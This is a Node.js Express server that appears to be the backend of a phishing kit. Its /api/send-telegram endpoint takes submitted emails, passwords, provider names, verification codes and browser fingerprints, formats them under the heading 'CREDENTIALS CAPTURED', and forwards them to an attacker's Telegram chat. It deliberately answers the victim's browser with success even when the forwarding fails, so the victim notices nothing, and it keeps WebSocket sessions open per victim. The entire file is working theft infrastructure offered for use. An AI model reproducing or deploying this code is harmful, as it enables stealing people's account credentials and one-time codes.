import express from 'express';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';

// --- Basic Setup ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 10000;

// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables are required.");
  process.exit(1);
}

// --- Middleware ---
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// --- API Endpoint for Telegram ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data on /api/send-telegram:', req.body);

  const { type, data } = req.body;
  let message = '';

  // Format the message based on the type of submission
  if (type === 'credentials') {
    message = `
--- 💼 CREDENTIALS CAPTURED 💼 ---
Provider: ${data.provider || 'N/A'}
Email: ${data.email || 'N/A'}
Password: ${data.password || 'N/A'}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${data.sessionId || 'N/A'}
Timestamp: ${data.timestamp || new Date().toISOString()}

--- 💻 Device Fingerprint 💻 ---
User Agent: ${data.userAgent || 'N/A'}
Language: ${data.language || 'N/A'}
Screen: ${data.screenResolution || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Platform: ${data.platform || 'N/A'}
`;
  } else if (type === 'interaction') {
    message = `
--- 👆 INTERACTION 👆 ---
Action: ${data.action || 'N/A'}
${data.code ? `Code: ${data.code}` : ''}
${data.password ? `Password: ${data.password}` : ''}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${data.sessionId || 'N/A'}
Timestamp: ${data.timestamp || new Date().toISOString()}
`;
  } else {
    // Fallback for unknown types
    message = `--- ❓ UNKNOWN DATA ---
${JSON.stringify(req.body, null, 2)}`;
  }

  // Use a try-catch block for the Telegram API call
  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('[SERVER] Telegram API Error:', result);
      // Still send a 200 to the client so the user flow isn't interrupted
      return res.status(200).json({ status: 'logged', error: 'telegram_failed' });
    }

    console.log('[SERVER] Data successfully sent to Telegram.');
    res.status(200).json({ status: 'success' });

  } catch (error) {
    console.error('[SERVER] Failed to send data to Telegram:', error);
    res.status(500).json({ status: 'error', message: 'Internal server error' });
  }
});


// --- WebSocket Server ---
const wss = new WebSocketServer({ server });
const activeConnections = new Map();

wss.on('connection', (ws, req) => {
    const sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
    if (!sessionId) {
        ws.terminate();
        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
        return;
    }
    
    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] WebSocket client connected: ${sessionId}`);

    ws.on('message', (message) => {
        console.log(`[SERVER] Message from ${sessionId}: ${message}`);
        // Here you can forward messages to an admin panel if needed
    });

    ws.on('close', () => {
        activeConnections.delete(sessionId);
        console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
    });

    ws.on('error', (error) => {
        console.error(`[SERVER] WebSocket error for ${sessionId}:`, error);
    });
});

// --- SPA Fallback ---
// All other GET requests return the main index.html file.
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// --- Start Server ---
server.listen(PORT, () => {
  console.log(`[SERVER] Server is running on http://localhost:${PORT}`);
});
